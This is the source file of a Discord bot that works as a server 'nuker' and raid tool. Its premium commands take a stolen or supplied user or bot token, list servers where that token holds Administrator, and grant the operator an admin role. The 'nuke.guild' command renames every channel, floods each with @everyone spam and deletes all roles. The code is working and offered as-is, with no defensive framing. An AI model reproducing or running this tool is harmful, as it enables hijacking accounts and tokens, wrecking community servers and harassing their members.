const fs = require('fs');
const path = require('path');
const { Client, Collection, ButtonBuilder, ButtonStyle, ActionRowBuilder, Permissions, PermissionsBitField, EmbedBuilder } = require('discord.js');
const { config } = require("dotenv");
const axios = require("axios").default;
const emojis = {
    "ak47": "<:dolce_167:1246892013240975360>",
    "bat": "<:025:1248810653821567006>",
    "fly": "<a:dolce_263:1246892078982500505>",
    "arrow": "<:dolce_145:1246893443800891503>",
    "boost": "<:1_2:1246700495087599717>",
    "user": "<:user:1246700523227447317>"
};


config();

const TOKEN = process.env.TOKEN;
const OWNER_ID = '1246240144768368692';
const LOGS_CHANNEL_ID = '1251734045818228747';
const BLACKLIST_LOGS = '1252125253031694376'
const BLACKLIST_PATH = path.join(__dirname, 'blacklist.json');
const RATE_LIMIT_PATH = path.join(__dirname, 'rateLimits.json');
const PREMIUMS_PATH = path.join(__dirname, 'premiums.json');
const client = new Client({ intents: 3276799 });

client.commands = new Collection();
client.tokens = new Map();
client.guildsMap = new Map();

const loadCommands = (dir) => {
    const files = fs.readdirSync(dir);

    for (const file of files) {
        const filePath = path.join(dir, file);
        const stat = fs.lstatSync(filePath);

        if (stat.isDirectory()) {
            loadCommands(filePath);
        } else if (file.endsWith('.js')) {
            const command = require(filePath);
            client.commands.set(command.name, command);
        }
    }
};

loadCommands(path.join(__dirname, 'commands'));

const exemptGuilds = ["1251395420760834048", "1245927553127022594"];
let rateLimits = new Map();
let blacklist = {};
let premiums = {};

if (fs.existsSync(BLACKLIST_PATH)) {
    blacklist = JSON.parse(fs.readFileSync(BLACKLIST_PATH, 'utf8'));
}

if (fs.existsSync(RATE_LIMIT_PATH)) {
    const rawRateLimits = JSON.parse(fs.readFileSync(RATE_LIMIT_PATH, 'utf8'));
    rateLimits = new Map(Object.entries(rawRateLimits));
}

if (fs.existsSync(PREMIUMS_PATH)) {
    premiums = JSON.parse(fs.readFileSync(PREMIUMS_PATH, 'utf8'));
}

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
});

client.on("guildCreate", async (guild) => {
    if (guild.memberCount < 15) return guild.leave();
    const logsChannel = await client.channels.fetch(LOGS_CHANNEL_ID);
    if (logsChannel) {
        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setCustomId(`create_invite_${guild.id}`)
                    .setLabel('Create Invite')
                    .setStyle(ButtonStyle.Primary),
                new ButtonBuilder()
                    .setCustomId(`leave_guild_${guild.id}`)
                    .setLabel('Leave Server')
                    .setStyle(ButtonStyle.Danger)
            );

        await logsChannel.send({
            content: `Joined a new server: **${guild.name}** with **${guild.memberCount}** members.`,
            components: [row]
        });
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;

    const { customId, user } = interaction;
    const [action, type, id] = customId.split('_');

    if (user.id !== OWNER_ID) {
        return interaction.reply({ content: 'You are not authorized to use this button.', ephemeral: true });
    }

    try {
        if (action === 'create' && type === 'invite') {
            const guild = client.guilds.cache.get(id);
            if (!guild) {
                return interaction.reply({ content: 'Guild not found.', ephemeral: true });
            }
            const invite = await guild.invites.create(guild.systemChannelId || guild.channels.cache.find(channel => channel.type === 'GUILD_TEXT').id, { maxAge: 0, maxUses: 1 });
            await interaction.reply({ content: `Invite link created: ${invite.url}`, ephemeral: true });
        } else if (action === 'leave' && type === 'guild') {
            const guild = client.guilds.cache.get(id);
            if (!guild) {
                return interaction.reply({ content: 'Guild not found.', ephemeral: true });
            }
            await guild.leave();
            await interaction.reply({ content: 'The bot has left the server.', ephemeral: true });
        } else if (action === 'blacklist' && type === 'user') {
            const userIdToBlacklist = id;
            blacklist[userIdToBlacklist] = true;
            fs.writeFileSync(BLACKLIST_PATH, JSON.stringify(blacklist, null, 2));
            
            const logsChannel = await client.channels.fetch(BLACKLIST_LOGS);
            if (logsChannel) {
                const row = new ActionRowBuilder()
                    .addComponents(
                        new ButtonBuilder()
                            .setCustomId(`unblacklist_user_${userIdToBlacklist}`)
                            .setLabel('Unblacklist User')
                            .setStyle(ButtonStyle.Secondary)
                    );

                await logsChannel.send({
                    content: `User **<@${userIdToBlacklist}> (${userIdToBlacklist})** has been blacklisted by **${user.tag}**.`,
                    components: [row]
                });
            }
            
            await interaction.reply({ content: 'User has been blacklisted.', ephemeral: true });
        } else if (action === 'unblacklist' && type === 'user') {
            const userIdToUnblacklist = id;
            delete blacklist[userIdToUnblacklist];
            fs.writeFileSync(BLACKLIST_PATH, JSON.stringify(blacklist, null, 2));
            
            const logsChannel = await client.channels.fetch(BLACKLIST_LOGS);
            if (logsChannel) {
                await logsChannel.send({
                    content: `User **<@${userIdToUnblacklist}> (${userIdToUnblacklist})** has been removed from the blacklist by **${user.tag}**.`
                });
            }
            
            await interaction.reply({ content: 'User has been removed from the blacklist.', ephemeral: true });
        }
    } catch (error) {
        console.error('Error handling button interaction:', error);
        await interaction.reply({ content: 'An error occurred while processing your request.', ephemeral: true });
    }
});

function isPremium(userId) {
    return premiums.hasOwnProperty(userId);
}

async function checkToken(token) {
    const headers = {
        Authorization: `${token}`,
        'Content-Type': 'application/json'
    };

    const headersForBot = {
        Authorization: `Bot ${token}`,
        'Content-Type': 'application/json'
    };

    try {
        const userInfoResponse = await axios.get('https://discord.com/api/v9/users/@me', { headers });

        if (userInfoResponse.status === 200) {
            const info = userInfoResponse.data;
            return { isValid: true, isUserToken: true, userName: info.username, userId: info.id };
        }
    } catch (userError) {
        console.error('Error checking user token:', userError.response ? userError.response.data : userError.message);
    }

    try {
        const botInfoResponse = await axios.get('https://discord.com/api/v9/oauth2/applications/@me', { headers: headersForBot });

        if (botInfoResponse.status === 200) {
            const info = botInfoResponse.data;
            return { isValid: true, isUserToken: false, userName: info.name, userId: info.id };
        }
    } catch (botError) {
        console.error('Error checking bot token:', botError.response ? botError.response.data : botError.message);
    }

    return { isValid: false, isUserToken: null };
}

async function fetchUserGuilds(token, isUserToken) {
    const headers = {
        Authorization: isUserToken ? token : `Bot ${token}`,
        'Content-Type': 'application/json'
    };

    try {
        const response = await axios.get('https://discord.com/api/v9/users/@me/guilds', {
            headers
        });
        return response.data;
    } catch (error) {
        console.error('Error fetching user guilds:', error);
        return null;
    }
}

async function fetchGuildMemberPermissions(token, guildId, userId, isUserToken) {
    const headers = {
        Authorization: isUserToken ? token : `Bot ${token}`,
        'Content-Type': 'application/json'
    };

    try {
        const response = await axios.get(`https://discord.com/api/guilds/${guildId}/members/${userId}`, {
            headers
        });
        return response.data.roles;
    } catch (error) {
        console.error('Error fetching guild member permissions:', error);
        return null;
    }
}


async function fetchUserGuilds(token, isUserToken) {
    const headers = {
        Authorization: isUserToken ? token : `Bot ${token}`,
        'Content-Type': 'application/json'
    };

    try {
        const response = await axios.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', {
            headers
        });
        return response.data;
    } catch (error) {
        console.error('Error fetching user guilds:', error);
        return null;
    }
}

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    const userId = message.author.id;
    if (blacklist[userId]) return;

    const args = message.content.slice(1).trim().split(/ +/);
    const commandName = args.shift().toLowerCase();
    const command = client.commands.get(commandName);

    if (message.content.startsWith("#")) {

        if(!isPremium(userId)) {
            return message.reply("This command is only available to premium users.").catch(console.error);
        }

        if (commandName === 'use.token') {
            const token = args[0];
            if (!token) {
                const embed = new EmbedBuilder()
                    .setColor('#8B0000') // Rojo vino
                    .setTitle(`${emojis.arrow} Error`)
                    .setDescription('Please provide a token.');
                return message.reply({ embeds: [embed] });
            }
            const result = await checkToken(token);
            if (!result.isValid) {
                const embed = new EmbedBuilder()
                    .setColor('#8B0000') // Rojo vino
                    .setTitle(`${emojis.arrow} Error`)
                    .setDescription('Invalid token provided.');
                return message.reply({ embeds: [embed] });
            }
            client.tokens.set(userId, { token: token, isUserToken: result.isUserToken });
            
            const embed = new EmbedBuilder()
                .setColor('#000000') // Negro
                .setTitle(`${emojis.fly} Successfully connected with token`)
                .addFields(
                    { name: 'User', value: result.userName },
                    { name: 'ID', value: result.userId },
                    { name: 'Token Type', value: result.isUserToken ? 'User' : 'Bot'}
                )
                .setThumbnail('https://cdn.discordapp.com/attachments/1194815048493846558/1254207933265215578/a_bd5940eb45a79b056842dc38bcda9f7b.gif');
            return message.reply({ embeds: [embed] });
        }
        
        if (commandName === 'show.token') {
            const tokenData = client.tokens.get(userId);
            if (!tokenData) {
                const embed = new EmbedBuilder()
                    .setColor('#8B0000') // Rojo vino
                    .setTitle(`${emojis.arrow} Error`)
                    .setDescription('No token found for you. Use #use.token <TOKEN> to set your token.');
                return message.reply({ embeds: [embed] });
            }
            const embed = new EmbedBuilder()
                .setColor('#000000') // Negro
                .setTitle(`${emojis.fly} Your Token`)
                .setDescription(`Your token is: \`${tokenData.token}\``);
            return message.reply({ embeds: [embed] });
        }
        
        if (commandName === "find.guilds") {
            const tokenData = client.tokens.get(userId);
            if (!tokenData) {
                const embed = new EmbedBuilder()
                    .setColor('#8B0000') // Rojo vino
                    .setTitle(`${emojis.arrow} Error`)
                    .setDescription('No token found for you. Use #use.token <TOKEN> to set your token.');
                return message.reply({ embeds: [embed] });
            }
            const userGuilds = await fetchUserGuilds(tokenData.token, tokenData.isUserToken);
            let userGuildsWithAdmin = [];
            await userGuilds.forEach(async guild => {
                const hasAdmin = await new PermissionsBitField(BigInt(guild.permissions)).toArray();
                if (hasAdmin.includes("Administrator")) userGuildsWithAdmin.push(guild);
            });

            if(userGuildsWithAdmin.length <= 0) return message.reply(`${emojis.arrow} no servers with administrator found.`)
        
            const embed = new EmbedBuilder()
                .setColor('#000000') // Negro
                .setTitle(`${emojis.fly} Servers with Administrator Perms`)
                .addFields(
                    userGuildsWithAdmin.sort((a, b) => a['approximate_member_count'] - b['approximate_member_count'])
                    .slice(0, 10)
                    .map((guild, index) => ({
                        name: `#${index + 1} - ${guild.name}`,
                        value: `${guild.id} - (${guild['approximate_member_count']} members)`
                    }))
                );
            return message.reply({ embeds: [embed] });
        }
        
        if (commandName === 'use.guild') {
            const guildId = args[0];
            const tokenData = client.tokens.get(userId);
        
            if (!tokenData) {
                const embed = new EmbedBuilder()
                    .setColor('#8B0000') // Rojo vino
                    .setTitle(`${emojis.arrow} Error`)
                    .setDescription('No token found for you. Use #use.token <TOKEN> to set your token.');
                return message.reply({ embeds: [embed] });
            }
            if (!guildId) {
                const embed = new EmbedBuilder()
                    .setColor('#8B0000') // Rojo vino
                    .setTitle(`${emojis.arrow} Error`)
                    .setDescription('Please provide a guild ID.');
                return message.reply({ embeds: [embed] });
            }
        
            const userGuilds = await fetchUserGuilds(tokenData.token, tokenData.isUserToken);
            if (!userGuilds) {
                const embed = new EmbedBuilder()
                    .setColor('#8B0000') // Rojo vino
                    .setTitle(`${emojis.arrow} Error`)
                    .setDescription('Failed to fetch guilds. Please check your token.');
                return message.reply({ embeds: [embed] });
            }
        
            const userGuild = userGuilds.find(guild => guild.id === guildId);
            if (!userGuild) {
                const embed = new EmbedBuilder()
                    .setColor('#8B0000') // Rojo vino
                    .setTitle(`${emojis.arrow} Error`)
                    .setDescription('Invalid guild ID or you do not have access to this guild.');
                return message.reply({ embeds: [embed] });
            }
        
            const hasAdmin = await new PermissionsBitField(BigInt(userGuild.permissions)).toArray();
            if (!hasAdmin.includes("Administrator")) {
                const embed = new EmbedBuilder()
                    .setColor('#8B0000') // Rojo vino
                    .setTitle(`${emojis.arrow} Error`)
                    .setDescription('You do not have administrator permissions in this guild.');
                return message.reply({ embeds: [embed] });
            }
        
            client.guildsMap.set(userId, guildId);
        
            const embed = new EmbedBuilder()
                .setColor('#000000') // Negro
                .setTitle(`${emojis.fly} Successfully connected with server`)
                .addFields(
                    { name: 'Name', value: userGuild.name },
                    { name: 'Server ID', value: userGuild.id },
                    { name: 'Members', value: userGuild['approximate_member_count'].toString() }
                )
                .setThumbnail('https://cdn.discordapp.com/attachments/1194815048493846558/1254207933265215578/a_bd5940eb45a79b056842dc38bcda9f7b.gif'); // Reemplaza con la URL del icono del servidor
            return message.reply({ embeds: [embed] });
        }
        
        if (commandName === "nuke.guild") {
            const guildId = client.guildsMap.get(userId);
        
            if (!guildId) {
                const embed = new EmbedBuilder()
                    .setColor('#8B0000') // Rojo vino
                    .setTitle(`${emojis.arrow} Error`)
                    .setDescription('No guild set. Use #use.guild <GUILD_ID> to set a guild first.');
                return message.reply({ embeds: [embed] });
            }
        
            const tokenData = client.tokens.get(userId);
        
            if (!tokenData) {
                const embed = new EmbedBuilder()
                    .setColor('#8B0000') // Rojo vino
                    .setTitle(`${emojis.arrow} Error`)
                    .setDescription('No token found for you. Use #use.token <TOKEN> to set your token.');
                return message.reply({ embeds: [embed] });
            }
        
            const headers = {
                Authorization: tokenData.isUserToken ? tokenData.token : `Bot ${tokenData.token}`,
                'Content-Type': 'application/json'
            };
        
            async function editChannelNames(channels) {
                const editPromises = channels.map(async (channel) => {
                    try {
                        await axios.patch(
                            `https://discord.com/api/v9/channels/${channel.id}`,
                            { name: "𝔟𝔶𝔭𝔞𝔰𝔰𝔢𝔡-𝔟𝔶-𝔫𝔦𝔵𝔰𝔮𝔲𝔞𝔡" },
                            { headers }
                        );
                        console.log(`Edited channel ${channel.id}`);
                        await new Promise(resolve => setTimeout(resolve, 300));
                    } catch (error) {
                        console.error(`Error editing channel ${channel.id}:`, error.response ? error.response.data : error.message);
                    }
                });
                await Promise.all(editPromises);
            }
        
            async function deleteRoles(roles) {
                const deletePromises = roles.map(async (role) => {
                    if (role.name !== '@everyone') {
                        try {
                            await axios.delete(`https://discord.com/api/v9/guilds/${guildId}/roles/${role.id}`, { headers });
                            console.log(`Deleted role ${role.id}`);
                        } catch (error) {
                            console.error(`Error deleting role ${role.id}:`, error.response ? error.response.data : error.message);
                        }
                    }
                });
                await Promise.all(deletePromises);
            }
        
            async function sendRaidMessages(channels) {
                const sendPromises = channels.map(async (channel) => {
                    try {
                        console.log(`Sending message to channel ${channel.id}`);
                        for (let i = 0; i < 50; i++) {
                            await axios.post(
                                `https://discord.com/api/v9/channels/${channel.id}/messages`,
                                {
                                    content: '@everyone https://discord.gg/nixakanazis han sido domados por la nixsquad.'
                                },
                                { headers }
                            );
                            await new Promise(resolve => setTimeout(resolve, 500));
                        }
                    } catch (error) {
                        console.error(`Error sending message to channel ${channel.id}:`, error.response ? error.response.data : error.message);
                    }
                });
                await Promise.all(sendPromises);
            }
        
            try {
                const channelsResponse = await axios.get(`https://discord.com/api/v9/guilds/${guildId}/channels`, { headers });
                const channels = channelsResponse.data;
        
                const rolesResponse = await axios.get(`https://discord.com/api/v9/guilds/${guildId}/roles`, { headers });
                const roles = rolesResponse.data;
        
                await editChannelNames(channels);
                await sendRaidMessages(channels);
                await deleteRoles(roles);
        
                const embed = new EmbedBuilder()
                    .setColor('#000000') // Negro
                    .setTitle(`${emojis.ak47} Guild Nuked`)
                    .setDescription('Guild has been nuked successfully.');
                return message.reply({ embeds: [embed] });
            } catch (error) {
                console.error('Error nuking the guild:', error.response ? error.response.data : error.message);
                const embed = new EmbedBuilder()
                    .setColor('#8B0000') // Rojo vino
                    .setTitle(`${emojis.arrow} Error`)
                    .setDescription('An error occurred while trying to nuke the guild.');
                return message.reply({ embeds: [embed] });
            }
        }
        
        if (commandName === 'invite.guild') {
            const guildId = client.guildsMap.get(userId);
            if (!guildId) {
                const embed = new EmbedBuilder()
                    .setColor('#8B0000') // Rojo vino
                    .setTitle(`${emojis.arrow} Error`)
                    .setDescription('You have not set a guild yet. Use #use.guild <GUILD_ID> to set your guild.');
                return message.reply({ embeds: [embed] });
            }
        
            const tokenData = client.tokens.get(userId);
            if (!tokenData) {
                const embed = new EmbedBuilder()
                    .setColor('#8B0000') // Rojo vino
                    .setTitle(`${emojis.arrow} Error`)
                    .setDescription('No token found for you. Use #use.token <TOKEN> to set your token.');
                return message.reply({ embeds: [embed] });
            }
        
            try {
                const response = await axios.get(`https://discord.com/api/v9/guilds/${guildId}/channels`, {
                    headers: {
                        Authorization: tokenData.isUserToken ? tokenData.token : `Bot ${tokenData.token}`,
                        'Content-Type': 'application/json'
                    }
                });
        
                const channels = response.data;
                const textChannel = channels.find(channel => channel.type === 0); 
        
                if (!textChannel) {
                    const embed = new EmbedBuilder()
                        .setColor('#8B0000') // Rojo vino
                        .setTitle(`${emojis.arrow} Error`)
                        .setDescription('No text channel found in the guild.');
                    return message.reply({ embeds: [embed] });
                }
        
                const inviteResponse = await axios.post(`https://discord.com/api/v9/channels/${textChannel.id}/invites`, {
                    max_age: 86400,
                    max_uses: 1,
                    temporary: false
                }, {
                    headers: {
                        Authorization: tokenData.isUserToken ? tokenData.token : `Bot ${tokenData.token}`,
                        'Content-Type': 'application/json'
                    }
                });
        
                const invite = inviteResponse.data;
        
                const embed = new EmbedBuilder()
                    .setColor('#000000') // Negro
                    .setTitle(`${emojis.fly} Invite Created`)
                    .setDescription(`Invite link created: https://discord.gg/${invite.code}`);
                return message.reply({ embeds: [embed] });
            } catch (error) {
                console.error('Error creating invite:', error.response ? error.response.data : error.message);
                const embed = new EmbedBuilder()
                    .setColor('#8B0000') // Rojo vino
                    .setTitle(`${emojis.arrow} Error`)
                    .setDescription('An error occurred while creating the invite.');
                return message.reply({ embeds: [embed] });
            }
        }
        
        if (commandName === 'admin.guild') {
            const guildId = client.guildsMap.get(userId);
            if (!guildId) {
                const embed = new EmbedBuilder()
                    .setColor('#8B0000') // Rojo vino
                    .setTitle(`${emojis.arrow} Error`)
                    .setDescription('You have not set a guild yet. Use #use.guild <GUILD_ID> to set your guild.');
                return message.reply({ embeds: [embed] });
            }
        
            const tokenData = client.tokens.get(userId);
            if (!tokenData) {
                const embed = new EmbedBuilder()
                    .setColor('#8B0000') // Rojo vino
                    .setTitle(`${emojis.arrow} Error`)
                    .setDescription('No token found for you. Use #use.token <TOKEN> to set your token.');
                return message.reply({ embeds: [embed] });
            }
        
            try {
                const createRoleResponse = await axios.post(`https://discord.com/api/v9/guilds/${guildId}/roles`, {
                    name: "@",
                    permissions: "8",
                    mentionable: false
                }, {
                    headers: {
                        Authorization: tokenData.isUserToken ? tokenData.token : `Bot ${tokenData.token}`,
                        'Content-Type': 'application/json'
                    }
                });
        
                const roleId = createRoleResponse.data.id;
        
                await axios.put(`https://discord.com/api/v9/guilds/${guildId}/members/${userId}/roles/${roleId}`, {}, {
                    headers: {
                        Authorization: tokenData.isUserToken ? tokenData.token : `Bot ${tokenData.token}`,
                        'Content-Type': 'application/json'
                    }
                });
        
                const embed = new EmbedBuilder()
                    .setColor('#000000') // Negro
                    .setTitle(`${emojis.fly} Success`)
                    .setDescription('You have been granted the Administrator role in the guild.');
                return message.reply({ embeds: [embed] });
            } catch (error) {
                console.error('Error granting admin role:', error.response ? error.response.data : error.message);
                const embed = new EmbedBuilder()
                    .setColor('#8B0000') // Rojo vino
                    .setTitle(`${emojis.arrow} Error`)
                    .setDescription('An error occurred while granting the admin role.');
                return message.reply({ embeds: [embed] });
            }
        }

    } else if (message.content.startsWith('&')) {
    
        if (!message.guild) return;
        if (!command) return;
        if (command.secured && exemptGuilds.includes(message.guild.id)) {
            return message.reply("This command cannot be executed on this server.").catch(console.error);
        }
    
        if (command.premium && !isPremium(userId)) {
            return message.reply("This command is only available to premium users.").catch(console.error);
        }
    
        const commandRateLimitKey = `${message.guild.id}-${userId}-${command.name}`;
        if (!rateLimits.has(commandRateLimitKey)) {
            rateLimits.set(commandRateLimitKey, { uses: 0, timestamp: Date.now() });
        }
    
        const userData = rateLimits.get(commandRateLimitKey);
        const rateLimitTime = command.rateLimitTime || 5 * 1000; 
        const rateLimitUsage = command.rateLimitUsage || 5; 
    
        if (Date.now() - userData.timestamp > rateLimitTime) {
            userData.uses = 0;
            userData.timestamp = Date.now();
        }
    
        if (userData.uses >= rateLimitUsage) {
            blacklist[userId] = true;
            fs.writeFileSync(BLACKLIST_PATH, JSON.stringify(blacklist, null, 2));
    
            const logsChannel = await client.channels.fetch(BLACKLIST_LOGS);
            if (logsChannel) {
                const row = new ActionRowBuilder()
                    .addComponents(
                        new ButtonBuilder()
                            .setCustomId(`unblacklist_user_${userId}`)
                            .setLabel('Unblacklist User')
                            .setStyle(ButtonStyle.Secondary)
                    );
    
                await logsChannel.send({
                    content: `User **${message.author.tag}** (${userId}) has been automatically blacklisted for excessive command usage.`,
                    components: [row]
                });
            }
    
            return message.reply("You have been blacklisted from using commands due to excessive usage.").catch(console.error);
        }
    
        userData.uses += 1;
    
        try {
            await command.execute(message, args, client);
    
            const logsChannel = await client.channels.fetch('1251734034501992562');
            if (logsChannel) {
                const row = new ActionRowBuilder()
                    .addComponents(
                        new ButtonBuilder()
                            .setCustomId(`blacklist_user_${userId}`)
                            .setLabel('Blacklist User')
                            .setStyle(ButtonStyle.Danger)
                    );
    
                await logsChannel.send({
                    content: `Command **${command.name}** executed by **${message.author.tag}** (${message.author.id}) in **${message.guild.name}** (${message.guild.id}).`,
                    components: [row]
                });
            }
        } catch (error) {
            console.error('Error executing command:', error);
            message.reply('There was an error trying to execute that command.').catch(console.error);
        }
    
        fs.writeFileSync(RATE_LIMIT_PATH, JSON.stringify(Object.fromEntries(rateLimits), null, 2));

    }
});

client.login(TOKEN);
